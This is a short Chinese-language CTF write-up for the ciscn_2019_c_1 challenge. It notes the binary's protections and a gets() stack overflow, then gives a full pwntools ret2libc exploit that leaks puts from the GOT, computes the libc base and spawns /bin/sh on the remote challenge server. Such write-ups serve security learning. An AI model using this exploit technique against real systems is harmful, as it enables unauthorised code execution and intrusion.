# 知识点

ret2libc



# 题目分析

1. 查看保护情况，开启NX保护。

   ```bash
       Arch:     amd64-64-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x400000)
   ```

2. 拖入IDA分析，发现main函数菜单中只有一个encrypt函数可以调用。

   函数起始处存在gets函数栈溢出漏洞，可以通过puts函数泄漏libc从而进行ret2libc。

   <img src="./asset/ida1.png" alt="ida1" style="zoom: 42%;" />

# Exp

```python
from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = process('./ciscn_2019_c_1')
io = remote('node4.buuoj.cn', '28381')
elf = ELF('./ciscn_2019_c_1')
libc = ELF('./libc-2.27.so')

main = elf.sym['_start']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

ret = 0x4006b9
pop_rdi = 0x400c83

# leak puts
io.sendlineafter('choice!\n', '1')

payload = 'A' * 0x50 + 'deadbeef' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

io.sendlineafter('encrypted\n', payload)

puts_real = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success('puts_real = ' + hex(puts_real))

# leak libc
libc_base = puts_real - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

# ret2libc
io.sendlineafter('choice!\n', '1')

payload = 'A' * 0x50 + 'deadbeef' + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

io.sendlineafter('encrypted\n', payload)

io.interactive()
```

